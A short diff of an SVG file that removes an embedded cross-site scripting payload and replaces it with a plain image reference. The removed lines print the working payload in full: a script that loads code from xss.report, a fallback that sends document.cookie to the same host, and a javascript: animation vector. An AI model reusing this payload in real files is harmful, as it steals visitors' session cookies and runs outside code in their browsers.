@@ -1,17 +1,4 @@
-<?xml version="1.0" encoding="UTF-8"?>
-<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100" height="100">
-  <!-- Hidden XSS payload that maintains valid SVG structure -->
-  <rect width="100" height="100" fill="green"/>
-  <script type="text/javascript">
-    // Primary payload
-    var s=document.createElement('script');
-    s.src='https://xss.report/c/nuysec';
-    document.body.appendChild(s);
-    
-    // Backup payload if first fails
-    new Image().src='https://xss.report/c/nuysec?cookie='+encodeURIComponent(document.cookie);
-  </script>
-  
-  <!-- Alternative vector using SVG animation -->
-  <animate attributeName="href" values="javascript:var s=document.createElement('script');s.src='https://xss.report/c/nuysec';document.body.appendChild(s);" begin="0s"/>
+<svg width="200" height="200"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+  <image xlink:href="https://upload.wikimedia.org/wikipedia/commons/7/78/Image.jpg" height="200" width="200"/>
 </svg>
